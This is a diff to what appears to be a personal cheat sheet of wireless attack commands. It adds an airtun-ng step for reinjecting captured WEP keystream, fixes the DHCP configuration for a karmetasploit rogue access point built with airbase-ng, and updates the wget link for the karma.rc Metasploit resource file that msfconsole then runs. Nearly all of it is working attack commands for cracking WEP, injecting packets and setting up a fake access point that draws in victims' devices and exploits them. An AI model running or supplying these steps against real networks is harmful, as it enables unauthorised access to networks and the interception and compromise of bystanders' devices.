@@ -290,6 +290,8 @@ tcpdump -n -vvv -e s0 -r [CAPTURE FILE ] #Check health of file.
 
 --After PRGA is captured in frag or chop chop, and manipulated into a .cap with packetforge, reinject it
 aireplay-ng -2 -r [OUT FIlE.CAP] $WI_INTF
+--or
+airtun-ng -a $AP_MAC -y [PRGA FILE(IN).xor] $WI_INTF
 
 #second method to check the injectible.cap
 airdecap -e $ESSID -w [WEP KEY] [CAPTURE FILE]
@@ -447,7 +449,7 @@ aircrack-ng -w [WORD LIST] [CAPTURE FILE]
 
 --karmetasploit
 #requires dhcp server # some installation errors are expected
-#   apt-get install dhcp3-server
+#   apt-get install isc-dhcp-server # formerly dhcp3-server  
 airmon-ng start wlan0 3 #monitor mode on channel 3
 
 airbase-ng -c $AP_CH -P -C 60 -e $ESSID -v $WI_INTF
@@ -466,8 +468,8 @@ ddns-update-style none;
 authoritative;
 log-facility local7;
 subnet 10.0.0.0 netmask 255.255.255.0 {
-rante 10.0.0.100 10.0.0.254;
-option routers 10.9,0.0.1-5
+range 10.0.0.100 10.0.0.254;
+option routers 10.0.0.1;
 option domain-name-servers 10.0.0.1;}
 #END Edit
 touch /tmp/dhcp.log
@@ -479,7 +481,8 @@ dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcpd.log at0
 # -lf log file
 
 #download karmetasploit resource file
-wget http://metasploit.com/users/hdm/tools/karma.rc
+wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt    #http://metasploit.com/users/hdm/tools/karma.rc
+#note, you'll need to udpate the db configuration from the .rc
 # comment out first to lines about sqlite
 msfconsole -r karam.rc
 
